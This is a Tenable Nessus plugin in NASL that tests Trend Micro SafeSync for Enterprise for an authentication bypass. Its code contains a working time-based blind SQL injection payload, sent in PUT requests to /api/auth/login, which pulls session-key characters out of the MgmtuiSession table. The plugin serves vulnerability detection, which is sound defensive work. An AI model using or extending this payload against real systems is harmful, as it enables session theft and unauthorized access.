#
# (C) Tenable Network Security, Inc.
#
include("compat.inc");

if (description)
{
  script_id(100618);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2017/06/05 17:59:48 $");

  script_name(english:"Trend Micro SafeSync for Enterprise Authentication Bypass");
  script_summary(english:"Attempts to obtain part of a session key.");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by an
authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Trend Micro SafeSync for Enterprise (SSFE) application running on
the remote host is affected by an authentication bypass vulnerability.
An unauthenticated, remote attacker can exploit this, via a series of
HTTP PUT requests using specially crafted parameters, to disclose the
valid, unexpired session key of a logged in user from the
MgmtuiSession table, which can then be used to conduct further
attacks.

Note that SSFE is reportedly affected by additional vulnerabilities;
however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"https://success.trendmicro.com/solution/1116749");
  script_set_attribute(attribute:"solution", value:
"Upgrade to SSFE version 3.2 SP1 (build 1531) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");

  script_set_attribute(attribute:"plugin_publication_date", value:"2017/06/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:trendmicro:safesync_for_enterprise");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("trendmicro_ssfe_detect.nbin");
  script_require_ports("Services/www", 3443);
  script_require_keys("www/Trend Micro SafeSync for Enterprise");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

function get_sessionkey_char(port, pos, delay)
{
  local_var ch, chars, data, i, res, t1, t2, url;
 
  # A session key consists of lower-case hex chars 
  chars = "0123456789abcdef";
  url = "/api/auth/login";

  for (i = 0; i < strlen(chars); i++)
  {
    ch = chars[i]; 
    data = 
      '{"username":"administrator' + 
      "' union SELECT IF(SUBSTRING(sessionkey," +
      pos + ", 1) = '" + ch + "', SLEEP(" + delay + 
      '), null) FROM MgmtuiSession LIMIT 0,1 #","password":"foo"}';

    t1 = unixtime();
    res = http_send_recv3(
      method        : "PUT",
      item          : url,
      port          : port,
      data          : data,
      content_type  : "application/json",
      exit_on_fail  : TRUE
    );
    t2 = unixtime(); 
  
    # We should get a 400. If not, something is wrong 
    if(res[0] !~ "^HTTP/[0-9.]+ 400") 
      return NULL;
    
    if(t2 - t1 >= delay)
      return ch;
  } 

  return NULL;
}

app = "Trend Micro SafeSync for Enterprise";
get_kb_item_or_exit("www/" + app);

port = get_http_port(default:3443);

install = get_install_from_kb(
  appname      : app,
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

# A session key is a 40-byte, lower-case hexstring.
# Here we try to enumerate the first 8 hex chars.
n = 8;
delay = 10;
http_set_read_timeout(delay * 2);

skey = NULL;
for (i = 0; i < n; i++)
{
  ch = get_sessionkey_char(port:port, pos: i + 1, delay: delay);
  if (isnull(ch))
  {
    skey = NULL;
    break;
  }
  skey += ch;
}

if (! skey)
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}
else
{
  report = 
    "Nessus was able to retrieve the first " + n + " characters of a session key : "     + skey + 
    '\n\nThe session keys are stored in the MgmtuiSession table in the osdp database. You can verify the session key recovered by Nessus.'; 
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    extra      : report,
    sqli       : TRUE
  );
}
